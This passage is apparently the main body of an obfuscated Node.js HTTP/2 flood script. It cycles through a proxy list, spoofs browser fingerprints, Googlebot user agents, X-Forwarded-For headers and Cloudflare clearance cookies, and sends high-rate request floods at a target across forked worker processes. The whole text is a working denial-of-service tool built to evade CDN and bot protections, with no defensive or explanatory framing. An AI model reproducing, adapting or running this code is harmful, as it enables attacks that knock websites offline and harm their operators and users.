6.0; MSIE 5.5; Windows NT 5.1)", "Mozilla/4.0 (compatible; MSIE 5.5;)", "Mozilla/4.0 (Compatible; MSIE 5.5; Windows NT5.0; Q312461; SV1; .NET CLR 1.1.4322; InfoPath.2)", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT5)", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; chromeframe/12.0.742.100; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.5)", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; FDM)", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322)", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9", "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240", "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Linux; Android 12; V2120 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36"];
version = ["\"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"", "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"98\"", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"", "\"Not_A Brand\";v=\"8\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"", "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"86\", \"Chromium\";v=\"86\"", "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"96\", \"Chromium\";v=\"96\"", "\"Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\""];
platform = ["Linux", "macOS", 'Windows'];
site = ["cross-site", 'same-origin', 'same-site', "none"];
mode = ['cors', "navigate", "no-cors", "same-origin"];
dest = ['document', 'image', "embed", 'empty', 'frame'];
const rateHeaders = [{
  'akamai-origin-hop': randstr(0x5)
}, {
  'source-ip': randstr(0x5)
}, {
  'via': randstr(0x5)
}, {
  'cluster-ip': randstr(0x5)
}];
const rateHeaders2 = [{
  'akamai-origin-hop': randstr(0x5)
}, {
  'source-ip': randstr(0x5)
}, {
  'via': randstr(0x5)
}, {
  'cluster-ip': randstr(0x5)
}];
const useragentl = ["(CheckSecurity 2_0)", "(BraveBrowser 5_0)", "(ChromeBrowser 3_0)", "(ChromiumBrowser 4_0)", "(AtakeBrowser 2_0)", '(NasaChecker)', "(CloudFlareIUAM)", "(NginxChecker)", '(AAPanel)', "(AntiLua)", "(FushLua)", "(FBIScan)", "(FirefoxTop)", "(ChinaNet Bot)"];
const mozilla = ["Mozilla/5.0 ", "Mozilla/6.0 ", "Mozilla/7.0 ", "Mozilla/8.0 ", "Mozilla/9.0 "];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
var ver = version[Math.floor(Math.floor(Math.random() * version.length))];
var az1 = useragentl[Math.floor(Math.floor(Math.random() * useragentl.length))];
var platforms = platform[Math.floor(Math.floor(Math.random() * platform.length))];
var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
var site1 = site[Math.floor(Math.floor(Math.random() * site.length))];
var moz = mozilla[Math.floor(Math.floor(Math.random() * mozilla.length))];
var mode1 = mode[Math.floor(Math.floor(Math.random() * mode.length))];
var dest1 = dest[Math.floor(Math.floor(Math.random() * dest.length))];
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let counter = 0x1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}
class NetSocket {
  constructor() {}
  ["HTTP"](_0x18c6f3, _0x297215) {
    const _0x3b98cd = "CONNECT " + _0x18c6f3.address + ":443 HTTP/1.1\r\nHost: " + _0x18c6f3.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x3650fa = new Buffer.from(_0x3b98cd);
    const _0x4a9aad = net.connect({
      'host': _0x18c6f3.host,
      'port': _0x18c6f3.port
    });
    _0x4a9aad.setTimeout(_0x18c6f3.timeout * 0x186a0);
    _0x4a9aad.setKeepAlive(true, 0x186a0);
    _0x4a9aad.on("connect", () => {
      _0x4a9aad.write(_0x3650fa);
    });
    _0x4a9aad.on("data", _0x4ab3a8 => {
      const _0x2f55a0 = _0x4ab3a8.toString("utf-8");
      const _0x1d0337 = _0x2f55a0.includes("HTTP/1.1 200");
      if (_0x1d0337 === false) {
        _0x4a9aad.destroy();
        return _0x297215(undefined, "error: invalid response from proxy server");
      }
      return _0x297215(_0x4a9aad, undefined);
    });
    _0x4a9aad.on("timeout", () => {
      _0x4a9aad.destroy();
      return _0x297215(undefined, "error: timeout exceeded");
    });
    _0x4a9aad.on("error", _0x4e0c18 => {
      _0x4a9aad.destroy();
      return _0x297215(undefined, "error: " + _0x4e0c18);
    });
  }
}
const Socker = new NetSocket();
headers[':method'] = 'GET';
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + '?' + randstr(0x5) + '=' + randstr(0xf);
headers[":scheme"] = "https";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = 'no-cache';
headers["X-Forwarded-For"] = spoofed;
headers['sec-ch-ua'] = "\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"";
headers["sec-ch-ua-mobile"] = '?0';
headers["sec-ch-ua-platform"] = 'Windows';
headers["accept-language"] = lang;
headers["accept-encoding"] = encoding;
headers["upgrade-insecure-requests"] = '1';
headers.accept = accept;
headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(0x7);
headers.referer = Ref;
headers['sec-fetch-mode'] = "navigate";
headers['sec-fetch-dest'] = dest1;
headers["sec-fetch-user"] = '?1';
headers.TE = 'trailers';
headers.cookie = "cf_clearance=" + randstr(0x4) + '.' + randstr(0x14) + '.' + randstr(0x28) + "-0.0.1 " + randstr(0x14) + ";_ga=" + randstr(0x14) + ";_gid=" + randstr(0xf);
headers['sec-fetch-site'] = site1;
headers["x-requested-with"] = 'XMLHttpRequest';
function runFlooder() {
  const _0x5f4a81 = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
  const _0x29c53a = _0x5f4a81.split(':');
  headers.origin = "https://" + parsedTarget.host;
  const _0x2d8083 = {
    'host': _0x29c53a[0x0],
    'port': ~~_0x29c53a[0x1],
    'address': parsedTarget.host + ':443',
    'timeout': 0x12c
  };
  Socker.HTTP(_0x2d8083, (_0x1ef375, _0x4422c4) => {
    if (_0x4422c4) {
      return;
    }
    _0x1ef375.setKeepAlive(true, 0x30d40);
    const _0x2d7ad6 = {
      'secure': true,
      'ALPNProtocols': ['h2', "http/1.1", "spdy/3.1"],
      'sigals': siga,
      'socket': _0x1ef375,
      'ciphers': cipper,
      'ecdhCurve': "prime256v1:X25519",
      'host': parsedTarget.host,
      'rejectUnauthorized': false,
      'servername': parsedTarget.host,
      'secureProtocol': "TLS_method",
      'secureProtocol': ['TLSv1_1_method', "TLS_method", 'TLSv1_2_method', "TLSv1_3_method"]
    };
    const _0xef3f9e = tls.connect(0x1bb, parsedTarget.host, _0x2d7ad6);
    _0xef3f9e.setKeepAlive(true, 0xea60);
    const _0xf5acd4 = http2.connect(parsedTarget.href, {
      'protocol': "https:",
      'settings': {
        'headerTableSize': 0x10000,
        'maxConcurrentStreams': 0x2710,
        'initialWindowSize': 0x600000,
        'maxHeaderListSize': 0x10000,
        'enablePush': false
      },
      'maxSessionMemory': 0xfa00,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => _0xef3f9e,
      'socket': _0x1ef375
    });
    _0xf5acd4.settings({
      'headerTableSize': 0x10000,
      'maxConcurrentStreams': 0x2710,
      'initialWindowSize': 0x600000,
      'maxHeaderListSize': 0x10000,
      'enablePush': false
    });
    setInterval(() => {
      _0xf5acd4.on('connect', () => {
        const _0x418a0c = {
          ...headers,
          ...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
          ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
        };
        for (let _0x38a2cc = 0x0; _0x38a2cc < args.Rate; _0x38a2cc++) {
          const _0x3ca47a = _0xf5acd4.request(_0x418a0c);
          _0x3ca47a.on("response", _0x11efd2 => {
            _0x3ca47a.close();
            _0x3ca47a.destroy();
            return;
          });
          _0x3ca47a.end();
        }
      });
    });
    _0xf5acd4.on("close", () => {
      _0xf5acd4.destroy();
      _0x1ef375.destroy();
      return;
    });
  });
  (function (_0x2f01ca, _0x2b93ac, _0x8f8253) {});
}
const KillScript = () => process.exit(0x1);
setTimeout(KillScript, args.time * 0x3e8);